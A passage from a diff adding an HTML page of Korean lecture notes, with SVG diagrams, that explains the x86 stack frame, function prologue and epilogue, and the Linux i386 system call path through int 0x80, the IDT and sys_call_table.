+                <rect x="70" y="84" width="180" height="32" fill="#1e2a44" stroke="#2d3850"/><text x="160" y="105" text-anchor="middle" fill="#9aa5b8" font-size="11">미사용 (int c)</text>
+                <rect x="70" y="116" width="180" height="32" fill="#1e2a44" stroke="#2d3850"/><text x="160" y="137" text-anchor="middle" fill="#e5e9f0" font-size="11">2</text>
+                <rect x="70" y="148" width="180" height="32" fill="#1e2a44" stroke="#2d3850"/><text x="160" y="169" text-anchor="middle" fill="#e5e9f0" font-size="11">1</text>
+                <rect x="70" y="180" width="180" height="36" fill="#2a3b5e" stroke="#f87171"/><text x="160" y="202" text-anchor="middle" fill="#f87171" font-size="11">function ret (0x565561ac)</text>
+                <rect x="70" y="216" width="180" height="70" fill="#0d1322" stroke="#2d3850"/>
+                <line x1="28" y1="84" x2="68" y2="84" stroke="#4f8cff" stroke-width="2" marker-end="url(#a6)"/><text x="4" y="88" fill="#4f8cff" font-size="12" class="svg-mono">ebp</text>
+                <line x1="250" y1="216" x2="292" y2="216" stroke="#38bdf8" stroke-width="2" marker-end="url(#a6b)"/><text x="296" y="220" fill="#38bdf8" font-size="12" class="svg-mono">esp</text>
+                <text x="160" y="310" text-anchor="middle" fill="#9aa5b8" font-size="11">하위 (0x00000000)</text>
+                <defs>
+                  <marker id="a6" markerWidth="8" markerHeight="8" refX="6" refY="3" orient="auto"><path d="M0,0 L6,3 L0,6 Z" fill="#4f8cff"/></marker>
+                  <marker id="a6b" markerWidth="8" markerHeight="8" refX="6" refY="3" orient="auto"><path d="M0,0 L6,3 L0,6 Z" fill="#38bdf8"/></marker>
+                </defs>
+              </svg>
+              <div class="svg-caption">return address가 push됨</div>
+            </div>
+          </div>
+        </div>
+        <span class="slide-ref">slide 31</span>
+      </div>
+
+      <!-- <7><8> -->
+      <div class="card">
+        <h3>&lt;7&gt; push %ebp &nbsp;/&nbsp; &lt;8&gt; mov %esp,%ebp — function의 프롤로그</h3>
+        <div class="split">
+          <div class="desc">
+            <ul>
+              <li><strong>&lt;7&gt;</strong>: 현재 레지스터의 ebp 값(= main 함수의 ebp)을 스택에 저장한다. 이로써 호출 체인이 연결된다.</li>
+              <li><strong>&lt;8&gt;</strong>: function(1,2)의 프롤로그. esp를 ebp에 복사하여 새 함수의 기준점을 세운다.</li>
+              <li>이제 ebp를 기준으로 <code class="inline">0x8(%ebp)=인자1</code>, <code class="inline">0xc(%ebp)=인자2</code>로 접근 가능하다.</li>
+            </ul>
+          </div>
+          <div>
+            <div class="svg-wrap">
+              <svg viewBox="0 0 320 360" xmlns="http://www.w3.org/2000/svg">
+                <rect x="70" y="16" width="180" height="30" fill="#1e2a44" stroke="#2d3850"/><text x="160" y="36" text-anchor="middle" fill="#e5e9f0" font-size="11">ret (return address)</text>
+                <rect x="70" y="46" width="180" height="30" fill="#1e2a44" stroke="#2d3850"/><text x="160" y="66" text-anchor="middle" fill="#fbbf24" font-size="11">최초 ebp 값</text>
+                <rect x="70" y="76" width="180" height="30" fill="#1e2a44" stroke="#2d3850"/><text x="160" y="96" text-anchor="middle" fill="#9aa5b8" font-size="11">미사용 (int c)</text>
+                <rect x="70" y="106" width="180" height="30" fill="#1e2a44" stroke="#2d3850"/><text x="160" y="126" text-anchor="middle" fill="#e5e9f0" font-size="11">2  &lt;- 0xc(%ebp)</text>
+                <rect x="70" y="136" width="180" height="30" fill="#1e2a44" stroke="#2d3850"/><text x="160" y="156" text-anchor="middle" fill="#e5e9f0" font-size="11">1  &lt;- 0x8(%ebp)</text>
+                <rect x="70" y="166" width="180" height="30" fill="#1e2a44" stroke="#2d3850"/><text x="160" y="186" text-anchor="middle" fill="#e5e9f0" font-size="11">function ret</text>
+                <rect x="70" y="196" width="180" height="34" fill="#2a3b5e" stroke="#2d3850"/><text x="160" y="218" text-anchor="middle" fill="#34d399" font-size="11">main 함수의 ebp 값</text>
+                <rect x="70" y="230" width="180" height="70" fill="#0d1322" stroke="#2d3850"/>
+                <line x1="28" y1="196" x2="68" y2="196" stroke="#4f8cff" stroke-width="2" marker-end="url(#a8)"/><text x="4" y="200" fill="#4f8cff" font-size="12" class="svg-mono">ebp</text>
+                <line x1="250" y1="230" x2="292" y2="230" stroke="#38bdf8" stroke-width="2" marker-end="url(#a8b)"/><text x="296" y="234" fill="#38bdf8" font-size="12" class="svg-mono">esp</text>
+                <defs>
+                  <marker id="a8" markerWidth="8" markerHeight="8" refX="6" refY="3" orient="auto"><path d="M0,0 L6,3 L0,6 Z" fill="#4f8cff"/></marker>
+                  <marker id="a8b" markerWidth="8" markerHeight="8" refX="6" refY="3" orient="auto"><path d="M0,0 L6,3 L0,6 Z" fill="#38bdf8"/></marker>
+                </defs>
+              </svg>
+              <div class="svg-caption">function 프롤로그 후 (ebp=esp)</div>
+            </div>
+          </div>
+        </div>
+        <span class="slide-ref">slide 32–33</span>
+      </div>
+    </section>
+
+    <!-- ========= 04 ========= -->
+    <section id="s04">
+      <div class="sec-head"><span class="sec-num">04</span><h2>함수 본문 &amp; 에필로그 분석 &lt;9&gt;–&lt;18&gt;</h2></div>
+      <div class="sec-divider"></div>
+
+      <!-- <9> -->
+      <div class="card">
+        <h3>&lt;9&gt; sub $0xc, %esp — char buffer[10] 할당</h3>
+        <div class="split">
+          <div class="desc">
+            <ul>
+              <li><code class="inline">char buffer[10]</code>을 위한 공간 할당.</li>
+              <li>실질적으로 10바이트만 필요하지만, <strong>4-byte alignment</strong>에 의해 12(=0xc)바이트가 할당된다.</li>
+            </ul>
+            <div class="callout key"><strong>핵심:</strong> 선언한 크기(10)와 실제 할당 크기(12)가 다를 수 있다 — 정렬 때문.</div>
+          </div>
+          <div>
+            <div class="svg-wrap">
+              <svg viewBox="0 0 320 360" xmlns="http://www.w3.org/2000/svg">
+                <rect x="70" y="14" width="180" height="26" fill="#1e2a44" stroke="#2d3850"/><text x="160" y="31" text-anchor="middle" fill="#e5e9f0" font-size="10">ret (return address)</text>
+                <rect x="70" y="40" width="180" height="26" fill="#1e2a44" stroke="#2d3850"/><text x="160" y="57" text-anchor="middle" fill="#fbbf24" font-size="10">최초 ebp 값</text>
+                <rect x="70" y="66" width="180" height="26" fill="#1e2a44" stroke="#2d3850"/><text x="160" y="83" text-anchor="middle" fill="#9aa5b8" font-size="10">미사용 (int c)</text>
+                <rect x="70" y="92" width="180" height="26" fill="#1e2a44" stroke="#2d3850"/><text x="160" y="109" text-anchor="middle" fill="#e5e9f0" font-size="10">2</text>
+                <rect x="70" y="118" width="180" height="26" fill="#1e2a44" stroke="#2d3850"/><text x="160" y="135" text-anchor="middle" fill="#e5e9f0" font-size="10">1</text>
+                <rect x="70" y="144" width="180" height="26" fill="#1e2a44" stroke="#2d3850"/><text x="160" y="161" text-anchor="middle" fill="#e5e9f0" font-size="10">function ret</text>
+                <rect x="70" y="170" width="180" height="26" fill="#1e2a44" stroke="#2d3850"/><text x="160" y="187" text-anchor="middle" fill="#e5e9f0" font-size="10">main 함수의 ebp 값</text>
+                <rect x="70" y="196" width="180" height="56" fill="#2a3b5e" stroke="#34d399"/><text x="160" y="220" text-anchor="middle" fill="#34d399" font-size="11">char buffer[10]</text><text x="160" y="238" text-anchor="middle" fill="#34d399" font-size="11">12 bytes 할당</text>
+                <rect x="70" y="252" width="180" height="56" fill="#0d1322" stroke="#2d3850"/>
+                <line x1="28" y1="170" x2="68" y2="170" stroke="#4f8cff" stroke-width="2" marker-end="url(#a9)"/><text x="4" y="174" fill="#4f8cff" font-size="12" class="svg-mono">ebp</text>
+                <line x1="250" y1="252" x2="292" y2="252" stroke="#38bdf8" stroke-width="2" marker-end="url(#a9b)"/><text x="296" y="256" fill="#38bdf8" font-size="12" class="svg-mono">esp</text>
+                <defs>
+                  <marker id="a9" markerWidth="8" markerHeight="8" refX="6" refY="3" orient="auto"><path d="M0,0 L6,3 L0,6 Z" fill="#4f8cff"/></marker>
+                  <marker id="a9b" markerWidth="8" markerHeight="8" refX="6" refY="3" orient="auto"><path d="M0,0 L6,3 L0,6 Z" fill="#38bdf8"/></marker>
+                </defs>
+              </svg>
+              <div class="svg-caption">buffer 12바이트 할당</div>
+            </div>
+          </div>
+        </div>
+        <span class="slide-ref">slide 34</span>
+      </div>
+
+      <!-- <10> -->
+      <div class="card">
+        <h3>&lt;10&gt; mov 0xc(%ebp), %eax — 인자 b 로드</h3>
+        <div class="split">
+          <div class="desc">
+            <ul>
+              <li>ebp에 12(0xc)바이트를 더한 주소의 값(=<strong>2</strong>, 즉 인자 b)을 eax에 복사한다.</li>
+              <li><code class="inline">a=a+b</code> 계산을 위해 b를 먼저 레지스터로 가져온다.</li>
+            </ul>
+          </div>
+          <div>
+            <div class="svg-wrap">
+              <svg viewBox="0 0 360 200" xmlns="http://www.w3.org/2000/svg">
+                <!-- stack portion -->
+                <rect x="40" y="20" width="150" height="26" fill="#1e2a44" stroke="#2d3850"/><text x="115" y="37" text-anchor="middle" fill="#9aa5b8" font-size="10">미사용 (int c)</text>
+                <rect x="40" y="46" width="150" height="30" fill="#2a3b5e" stroke="#34d399"/><text x="115" y="65" text-anchor="middle" fill="#34d399" font-size="11">2</text>
+                <rect x="40" y="76" width="150" height="26" fill="#1e2a44" stroke="#2d3850"/><text x="115" y="93" text-anchor="middle" fill="#e5e9f0" font-size="10">1</text>
+                <text x="18" y="65" fill="#38bdf8" font-size="9" class="svg-mono" text-anchor="end">12(%ebp)</text>
+                <line x1="38" y1="61" x2="22" y2="61" stroke="#38bdf8" stroke-width="1.5"/>
+                <!-- CPU -->
+                <rect x="240" y="40" width="100" height="60" rx="8" fill="#0d1322" stroke="#4f8cff"/>
+                <text x="290" y="34" text-anchor="middle" fill="#4f8cff" font-size="11" class="svg-mono">CPU</text>
+                <rect x="252" y="58" width="76" height="28" fill="#26324d" stroke="#2d3850"/><text x="290" y="77" text-anchor="middle" fill="#34d399" font-size="13">eax = 2</text>
+                <!-- arrow -->
+                <path d="M190,61 L230,61 L230,72 L250,72" fill="none" stroke="#34d399" stroke-width="2" marker-end="url(#a10)"/>
+                <defs><marker id="a10" markerWidth="8" markerHeight="8" refX="6" refY="3" orient="auto"><path d="M0,0 L6,3 L0,6 Z" fill="#34d399"/></marker></defs>
+              </svg>
+              <div class="svg-caption">eax ← 2 (인자 b)</div>
+            </div>
+          </div>
+        </div>
+        <span class="slide-ref">slide 35</span>
+      </div>
+
+      <!-- <11> -->
+      <div class="card">
+        <h3>&lt;11&gt; add %eax, 0x8(%ebp) — a = a + b</h3>
+        <div class="split">
+          <div class="desc">
+            <ul>
+              <li>ebp에 8바이트를 더한 주소의 값(=<strong>1</strong>, 인자 a)에 eax(=2)를 더한다.</li>
+              <li>결과: <code class="inline">0x8(%ebp)</code> 위치가 <strong>1 + 2 = 3</strong>이 된다.</li>
+              <li>즉 메모리상의 인자 a가 직접 갱신된다 (eax는 2 유지).</li>
+            </ul>
+          </div>
+          <div>
+            <div class="svg-wrap">
+              <svg viewBox="0 0 360 200" xmlns="http://www.w3.org/2000/svg">
+                <rect x="40" y="20" width="150" height="26" fill="#1e2a44" stroke="#2d3850"/><text x="115" y="37" text-anchor="middle" fill="#e5e9f0" font-size="10">2</text>
+                <rect x="40" y="46" width="150" height="30" fill="#2a3b5e" stroke="#34d399"/><text x="115" y="65" text-anchor="middle" fill="#34d399" font-size="11">1 + 2</text>
+                <rect x="40" y="76" width="150" height="26" fill="#1e2a44" stroke="#2d3850"/><text x="115" y="93" text-anchor="middle" fill="#9aa5b8" font-size="10">function ret</text>
+                <text x="18" y="65" fill="#38bdf8" font-size="9" class="svg-mono" text-anchor="end">8(%ebp)</text>
+                <line x1="38" y1="61" x2="22" y2="61" stroke="#38bdf8" stroke-width="1.5"/>
+                <rect x="240" y="40" width="100" height="60" rx="8" fill="#0d1322" stroke="#4f8cff"/>
+                <text x="290" y="34" text-anchor="middle" fill="#4f8cff" font-size="11" class="svg-mono">CPU</text>
+                <rect x="252" y="58" width="76" height="28" fill="#26324d" stroke="#2d3850"/><text x="290" y="77" text-anchor="middle" fill="#fbbf24" font-size="13">eax = 2</text>
+                <path d="M250,72 L230,72 L230,61 L192,61" fill="none" stroke="#fbbf24" stroke-width="2" marker-end="url(#a11)"/>
+                <defs><marker id="a11" markerWidth="8" markerHeight="8" refX="6" refY="3" orient="auto"><path d="M0,0 L6,3 L0,6 Z" fill="#fbbf24"/></marker></defs>
+              </svg>
+              <div class="svg-caption">a(1) += eax(2) → 3</div>
+            </div>
+          </div>
+        </div>
+        <span class="slide-ref">slide 36</span>
+      </div>
+
+      <!-- <12> -->
+      <div class="card">
+        <h3>&lt;12&gt; mov 0x8(%ebp), %eax — 반환값 준비</h3>
+        <div class="split">
+          <div class="desc">
+            <ul>
+              <li>ebp+8 주소의 값(=<strong>3</strong>)을 eax에 저장한다.</li>
+              <li>x86 cdecl에서 <strong>함수 반환값은 eax</strong>에 담긴다. 따라서 <code class="inline">return a;</code>를 위해 결과 3을 eax에 적재한다.</li>
+            </ul>
+          </div>
+          <div>
+            <div class="svg-wrap">
+              <svg viewBox="0 0 360 200" xmlns="http://www.w3.org/2000/svg">
+                <rect x="40" y="20" width="150" height="26" fill="#1e2a44" stroke="#2d3850"/><text x="115" y="37" text-anchor="middle" fill="#e5e9f0" font-size="10">2</text>
+                <rect x="40" y="46" width="150" height="30" fill="#2a3b5e" stroke="#34d399"/><text x="115" y="65" text-anchor="middle" fill="#34d399" font-size="11">3</text>
+                <rect x="40" y="76" width="150" height="26" fill="#1e2a44" stroke="#2d3850"/><text x="115" y="93" text-anchor="middle" fill="#9aa5b8" font-size="10">function ret</text>
+                <text x="18" y="65" fill="#38bdf8" font-size="9" class="svg-mono" text-anchor="end">8(%ebp)</text>
+                <line x1="38" y1="61" x2="22" y2="61" stroke="#38bdf8" stroke-width="1.5"/>
+                <rect x="240" y="40" width="100" height="60" rx="8" fill="#0d1322" stroke="#4f8cff"/>
+                <text x="290" y="34" text-anchor="middle" fill="#4f8cff" font-size="11" class="svg-mono">CPU</text>
+                <rect x="252" y="58" width="76" height="28" fill="#26324d" stroke="#2d3850"/><text x="290" y="77" text-anchor="middle" fill="#34d399" font-size="13">eax = 3</text>
+                <path d="M190,61 L230,61 L230,72 L250,72" fill="none" stroke="#34d399" stroke-width="2" marker-end="url(#a12)"/>
+                <defs><marker id="a12" markerWidth="8" markerHeight="8" refX="6" refY="3" orient="auto"><path d="M0,0 L6,3 L0,6 Z" fill="#34d399"/></marker></defs>
+              </svg>
+              <div class="svg-caption">eax ← 3 (반환값)</div>
+            </div>
+          </div>
+        </div>
+        <span class="slide-ref">slide 37</span>
+      </div>
+
+      <!-- <13><14> -->
+      <div class="card">
+        <h3>&lt;13&gt; leave &nbsp;/&nbsp; &lt;14&gt; ret — function 에필로그</h3>
+        <ul>
+          <li><strong>&lt;13&gt; leave</strong>: main 함수의 원래 ebp 값으로 복귀하고 함수를 끝낸다. <code class="inline">mov %ebp,%esp</code> + <code class="inline">pop %ebp</code>를 의미한다.</li>
+          <li><strong>&lt;14&gt; ret</strong>: function을 마치고 스택을 정리한다. <code class="inline">pop %eip</code>를 의미 → 스택에 저장된 <code class="inline">function ret(0x565561ac)</code>로 복귀한다.</li>
+        </ul>
+        <div class="callout key"><strong>leave = mov %ebp,%esp ; pop %ebp</strong> &nbsp;|&nbsp; <strong>ret = pop %eip</strong> — 이 두 쌍이 에필로그의 전부다.</div>
+        <span class="slide-ref">slide 38</span>
+      </div>
+
+      <!-- <15>~<18> -->
+      <div class="card">
+        <h3>&lt;15&gt;–&lt;18&gt; main으로 복귀 후 마무리</h3>
+        <ul>
+          <li><strong>&lt;15&gt; add $0x8, %esp</strong>: esp에 8바이트를 더한다 → 전달했던 인자 2개(1, 2)를 정리(caller가 인자 제거).</li>
+          <li><strong>&lt;16&gt; mov %eax, -0x4(%ebp)</strong>: ebp에서 4바이트를 뺀 주소(지역변수 <code class="inline">int c</code>)에 eax 값(3)을 복사 → <code class="inline">c = function(1,2)</code> 완료.</li>
+          <li><strong>&lt;17&gt; leave</strong>: main 함수를 끝낸다.</li>
+          <li><strong>&lt;18&gt; ret</strong>: main을 마치고 스택을 정리한다.</li>
+        </ul>
+        <div class="callout">여기까지가 "System Call Execution"으로 넘어가기 전, 일반 함수의 완전한 생명주기(프롤로그 → 본문 → 에필로그)이다.</div>
+        <span class="slide-ref">slide 38</span>
+      </div>
+    </section>
+
+    <!-- ========= 05 ========= -->
+    <section id="s05">
+      <div class="sec-head"><span class="sec-num">05</span><h2>시스템 콜 처리 과정</h2></div>
+      <div class="sec-divider"></div>
+
+      <div class="card">
+        <h3>시스템 콜 호출 예제 <span class="tag">User ↔ Kernel</span></h3>
+        <p class="lead">사용자 프로그램은 표준 C 라이브러리를 통해 실제 수행하는 커널 함수를 호출한다. 예: <code class="inline">pid = fork();</code></p>
+        <div class="svg-wrap">
+          <svg viewBox="0 0 640 260" xmlns="http://www.w3.org/2000/svg">
+            <!-- user prog -->
+            <rect x="20" y="20" width="230" height="130" rx="6" fill="#0d1322" stroke="#2d3850"/>
+            <text x="30" y="42" fill="#89ddff" font-size="12" class="svg-mono">#include &lt;unistd.h&gt;</text>
+            <text x="30" y="60" fill="#e5e9f0" font-size="12" class="svg-mono">int main() {</text>
+            <text x="40" y="78" fill="#e5e9f0" font-size="12" class="svg-mono">int pid;</text>
+            <rect x="38" y="88" width="150" height="22" fill="none" stroke="#f87171" stroke-dasharray="4"/>
+            <text x="46" y="104" fill="#f87171" font-size="12" class="svg-mono">pid = fork();</text>
+            <text x="40" y="126" fill="#e5e9f0" font-size="12" class="svg-mono">return 0;</text>
+            <text x="30" y="144" fill="#e5e9f0" font-size="12" class="svg-mono">}</text>
+            <text x="280" y="70" fill="#f87171" font-size="13">사용자 프로그램</text>
+            <text x="280" y="88" fill="#9aa5b8" font-size="11">(User mode)</text>
+
+            <!-- dashed boundary -->
+            <line x1="0" y1="175" x2="640" y2="175" stroke="#f87171" stroke-dasharray="6" stroke-width="1"/>
+
+            <!-- libc -->
+            <rect x="130" y="160" width="230" height="30" rx="6" fill="#26324d" stroke="#2d3850"/>
+            <text x="245" y="180" text-anchor="middle" fill="#e5e9f0" font-size="12">standard C Libraries</text>
+            <!-- syscall api -->
+            <rect x="130" y="200" width="230" height="52" rx="6" fill="#0d1322" stroke="#2d3850"/>
+            <text x="245" y="218" text-anchor="middle" fill="#89ddff" font-size="12">System Calls (API)</text>
+            <rect x="175" y="224" width="140" height="22" fill="#2a3b5e" stroke="#fbbf24"/>
+            <text x="245" y="240" text-anchor="middle" fill="#fbbf24" font-size="12" class="svg-mono">sys_fork()</text>
+            <text x="440" y="218" fill="#f87171" font-size="13">운영체제</text>
+            <text x="440" y="236" fill="#9aa5b8" font-size="11">(Kernel mode)</text>
+
+            <!-- arrows -->
+            <path d="M113,99 L113,175 L128,175" fill="none" stroke="#4f8cff" stroke-width="1.5" marker-end="url(#a5s)"/>
+            <defs><marker id="a5s" markerWidth="8" markerHeight="8" refX="6" refY="3" orient="auto"><path d="M0,0 L6,3 L0,6 Z" fill="#4f8cff"/></marker></defs>
+          </svg>
+          <div class="svg-caption">User mode → libc → System Call → Kernel mode</div>
+        </div>
+        <span class="slide-ref">slide 40</span>
+      </div>
+
+      <div class="card">
+        <h3>시스템 콜 처리 과정 단계 <span class="tag">libc.a → system_call()</span></h3>
+        <h4>① 사용자 프로세스 → libc.a</h4>
+        <ul>
+          <li>인자(argument)를 스택에 넣음</li>
+          <li>시스템 콜 번호를 (eax에) 저장</li>
+          <li><strong>Trap (= S/W Interrupt, int 0x80)</strong> 발생을 통해 IDT 호출</li>
+        </ul>
+        <h4>② system_call()</h4>
+        <ul>
+          <li>IDT에 의해 인터럽트 시작</li>
+          <li><code class="inline">sys_call_table</code> 사용 (eax 번호로 핸들러 인덱싱)</li>
+          <li>해당 핸들러 실행</li>
+        </ul>
+        <h4>③ 시스템 콜 핸들러 함수</h4>
+        <ul>
+          <li>시스템 콜 핸들러 함수는 약 <strong>440개</strong>까지 가능 (커널 5.15 기준)</li>
+        </ul>
+        <span class="slide-ref">slide 41</span>
+      </div>
+
+      <div class="card">
+        <h3>fork 시스템 콜 처리 흐름 <span class="tag">int 0x80</span></h3>
+        <p class="lead">전체 흐름을 한눈에: <code class="inline">fork()</code> → libc가 eax에 2(=__NR_fork) 저장 + <code class="inline">int $0x80</code> → IDT[0x80] = system_call() → sys_call_table[2] = sys_fork() → <code class="inline">/kernel/fork.c</code> 실행.</p>
+        <div class="svg-wrap">
+          <svg viewBox="0 0 660 300" xmlns="http://www.w3.org/2000/svg">
+            <!-- user task -->
+            <rect x="10" y="20" width="120" height="70" rx="5" fill="#0d1322" stroke="#2d3850"/>
+            <text x="70" y="16" text-anchor="middle" fill="#89ddff" font-size="11">user task</text>
+            <text x="20" y="40" fill="#e5e9f0" font-size="10" class="svg-mono">main(){..//</text>
+            <text x="20" y="56" fill="#f87171" font-size="10" class="svg-mono">fork();</text>
+            <text x="20" y="72" fill="#e5e9f0" font-size="10" class="svg-mono">...}</text>
+
+            <!-- libc -->
+            <rect x="10" y="120" width="150" height="110" rx="5" fill="#0d1322" stroke="#2d3850"/>
+            <text x="85" y="116" text-anchor="middle" fill="#89ddff" font-size="11">libc.a</text>
+            <text x="20" y="140" fill="#e5e9f0" font-size="10" class="svg-mono">fork() {</text>
+            <rect x="18" y="168" width="130" height="38" fill="#2a3b5e" stroke="#fbbf24"/>
+            <text x="24" y="184" fill="#fbbf24" font-size="10" class="svg-mono">mov 2, %eax</text>
+            <text x="24" y="200" fill="#fbbf24" font-size="10" class="svg-mono">int $0x80</text>
+
+            <!-- IDT -->
+            <rect x="210" y="40" width="150" height="180" rx="5" fill="#0d1322" stroke="#2d3850"/>
+            <text x="285" y="36" text-anchor="middle" fill="#89ddff" font-size="11">IDT</text>
+            <text x="180" y="58" fill="#9aa5b8" font-size="9" class="svg-mono">0x00</text>
+            <rect x="218" y="48" width="134" height="22" fill="#1e2a44" stroke="#2d3850"/><text x="285" y="63" text-anchor="middle" fill="#e5e9f0" font-size="10">divide_error()</text>
+            <rect x="218" y="70" width="134" height="22" fill="#1e2a44" stroke="#2d3850"/><text x="285" y="85" text-anchor="middle" fill="#e5e9f0" font-size="10">Debug()</text>
+            <rect x="218" y="92" width="134" height="22" fill="#1e2a44" stroke="#2d3850"/><text x="285" y="107" text-anchor="middle" fill="#e5e9f0" font-size="10">Nmi()</text>
+            <rect x="218" y="114" width="134" height="22" fill="#1e2a44" stroke="#2d3850"/><text x="285" y="129" text-anchor="middle" fill="#9aa5b8" font-size="10">...</text>
+            <text x="180" y="156" fill="#fbbf24" font-size="9" class="svg-mono">0x80</text>
+            <rect x="218" y="146" width="134" height="24" fill="#2a3b5e" stroke="#fbbf24"/><text x="285" y="162" text-anchor="middle" fill="#fbbf24" font-size="10">System_call();</text>
+
+            <!-- system_call box -->
+            <rect x="410" y="20" width="240" height="110" rx="5" fill="#0d1322" stroke="#2d3850"/>
+            <text x="420" y="40" fill="#89ddff" font-size="10" class="svg-mono">ENTRY(system_call)</text>
+            <text x="420" y="56" fill="#9aa5b8" font-size="9" class="svg-mono">/* arch/i386/.../entry.S */</text>
+            <text x="420" y="72" fill="#e5e9f0" font-size="9" class="svg-mono">SAVE_ALL</text>
+            <text x="420" y="92" fill="#c3e88d" font-size="9" class="svg-mono">call *sys_call_table</text>
+            <text x="420" y="106" fill="#c3e88d" font-size="9" class="svg-mono">(, %eax, 4)</text>
+
+            <!-- sys_call_table -->
+            <rect x="410" y="160" width="160" height="110" rx="5" fill="#0d1322" stroke="#2d3850"/>
+            <text x="490" y="156" text-anchor="middle" fill="#89ddff" font-size="11">sys_call_table</text>
+            <rect x="418" y="166" width="144" height="20" fill="#1e2a44" stroke="#2d3850"/><text x="428" y="181" fill="#e5e9f0" font-size="9" class="svg-mono">1  sys_exit()</text>
+            <rect x="418" y="186" width="144" height="22" fill="#2a3b5e" stroke="#fbbf24"/><text x="428" y="201" fill="#fbbf24" font-size="9" class="svg-mono">2  sys_fork()</text>
+            <rect x="418" y="208" width="144" height="20" fill="#1e2a44" stroke="#2d3850"/><text x="428" y="223" fill="#e5e9f0" font-size="9" class="svg-mono">3  sys_read()</text>
+            <rect x="418" y="228" width="144" height="20" fill="#1e2a44" stroke="#2d3850"/><text x="428" y="243" fill="#e5e9f0" font-size="9" class="svg-mono">4  sys_write()</text>
+
+            <!-- eax -->
+            <rect x="250" y="250" width="90" height="26" rx="4" fill="#26324d" stroke="#fbbf24"/><text x="295" y="267" text-anchor="middle" fill="#fbbf24" font-size="11" class="svg-mono">eax = 2</text>
+
+            <!-- arrows -->
+            <path d="M70,90 L70,118" stroke="#4f8cff" stroke-width="1.5" marker-end="url(#af)"/>
+            <path d="M148,187 L205,187 L205,158 L216,158" fill="none" stroke="#4f8cff" stroke-width="1.5" marker-end="url(#af)"/>
+            <path d="M352,158 L380,158 L380,70 L408,70" fill="none" stroke="#f87171" stroke-width="1.5" marker-end="url(#af)"/>
+            <path d="M408,98 L395,98 L395,197 L414,197" fill="none" stroke="#4f8cff" stroke-width="1.5" marker-end="url(#af)"/>
+            <defs><marker id="af" markerWidth="8" markerHeight="8" refX="6" refY="3" orient="auto"><path d="M0,0 L6,3 L0,6 Z" fill="#4f8cff"/></marker></defs>
+          </svg>
+          <div class="svg-caption">fork() → int 0x80 → IDT[0x80] → sys_call_table[2] → sys_fork()</div>
+        </div>
+        <span class="slide-ref">slide 42</span>
+      </div>
+    </section>
+
+    <!-- ========= 06 ========= -->
+    <section id="s06">
+      <div class="sec-head"><span class="sec-num">06</span><h2>IDT &amp; 시스템 콜 종류</h2></div>
+      <div class="sec-divider"></div>
+
+      <div class="card">
+        <h3>IDT (Interrupt Descriptor Table) <span class="tag">i386</span></h3>
+        <ul>
+          <li>i386에서는 IDT를 통해 모든 인터럽트가 관리된다.</li>
+          <li>시스템 콜은 <strong>0x80번</strong> 인터럽트(SYSCALL_VECTOR)를 사용한다.</li>
+        </ul>
+        <div class="svg-wrap">
+          <svg viewBox="0 0 560 300" xmlns="http://www.w3.org/2000/svg">
+            <text x="200" y="18" text-anchor="middle" fill="#89ddff" font-size="12">idt_table</text>
+            <text x="30" y="42" fill="#9aa5b8" font-size="10" class="svg-mono">0x0</text>
+            <rect x="70" y="28" width="260" height="22" fill="#1e2a44" stroke="#2d3850"/><text x="200" y="43" text-anchor="middle" fill="#e5e9f0" font-size="11">divide_error( )</text>
+            <rect x="70" y="50" width="260" height="22" fill="#1e2a44" stroke="#2d3850"/><text x="200" y="65" text-anchor="middle" fill="#e5e9f0" font-size="11">debug( )</text>
+            <rect x="70" y="72" width="260" height="22" fill="#1e2a44" stroke="#2d3850"/><text x="200" y="87" text-anchor="middle" fill="#e5e9f0" font-size="11">nmi( )</text>
+            <rect x="70" y="94" width="260" height="22" fill="#1e2a44" stroke="#2d3850"/><text x="200" y="109" text-anchor="middle" fill="#e5e9f0" font-size="11">segment_not_present( )</text>
+            <rect x="70" y="116" width="260" height="22" fill="#1e2a44" stroke="#2d3850"/><text x="200" y="131" text-anchor="middle" fill="#e5e9f0" font-size="11">page_fault( )</text>
+            <rect x="70" y="138" width="260" height="22" fill="#1e2a44" stroke="#2d3850"/><text x="200" y="153" text-anchor="middle" fill="#9aa5b8" font-size="11">....</text>
+            <text x="30" y="178" fill="#9aa5b8" font-size="10" class="svg-mono">0x20</text>
+            <rect x="70" y="160" width="260" height="22" fill="#1e2a44" stroke="#2d3850"/><text x="200" y="175" text-anchor="middle" fill="#e5e9f0" font-size="11">timer_interrupt( )</text>
+            <rect x="70" y="182" width="260" height="22" fill="#1e2a44" stroke="#2d3850"/><text x="200" y="197" text-anchor="middle" fill="#e5e9f0" font-size="11">hd_interrupt( )</text>
+            <text x="30" y="228" fill="#fbbf24" font-size="10" class="svg-mono">0x80</text>
+            <rect x="70" y="214" width="260" height="24" fill="#2a3b5e" stroke="#fbbf24"/><text x="200" y="230" text-anchor="middle" fill="#fbbf24" font-size="11">system_call( )</text>
+            <rect x="70" y="238" width="260" height="20" fill="#1e2a44" stroke="#2d3850"/><text x="200" y="252" text-anchor="middle" fill="#9aa5b8" font-size="11">....</text>
+            <text x="30" y="270" fill="#9aa5b8" font-size="10" class="svg-mono">0xff</text>
+            <!-- brackets -->
+            <path d="M338,28 L352,28 L352,160 L338,160" fill="none" stroke="#4f8cff" stroke-width="1.5"/>
+            <text x="360" y="98" fill="#4f8cff" font-size="11">common trap handler</text>
+            <path d="M338,160 L352,160 L352,204 L338,204" fill="none" stroke="#38bdf8" stroke-width="1.5"/>
+            <text x="360" y="178" fill="#38bdf8" font-size="10">FIRST_EXTERNAL_VECTOR</text>
+            <text x="360" y="192" fill="#9aa5b8" font-size="10">device interrupt handler</text>
+            <text x="360" y="230" fill="#fbbf24" font-size="11">SYSCALL_VECTOR</text>
+          </svg>
+          <div class="svg-caption">IDT 구조 — 0x80이 system_call()</div>
+        </div>
+        <span class="slide-ref">slide 43</span>
+      </div>
+
+      <div class="card">
+        <h3>시스템 콜의 종류 <span class="tag">unistd_32.h</span></h3>
+        <p class="lead">각 시스템 콜은 고유 번호(<code class="inline">__NR_*</code>)로 구별된다. 정의 위치: <code class="inline">/usr/include/asm/unistd_32.h</code> (Ubuntu 20.04 기준).</p>
+        <div class="tbl-wrap">
+          <table>
+            <thead><tr><th class="mono">매크로</th><th class="mono">번호</th><th class="mono">매크로</th><th class="mono">번호</th></tr></thead>
+            <tbody>
+              <tr><td class="mono" style="color:#82aaff">__NR_exit</td><td class="mono">1</td><td class="mono">__NR_sched_getaffinity</td><td class="mono">242</td></tr>
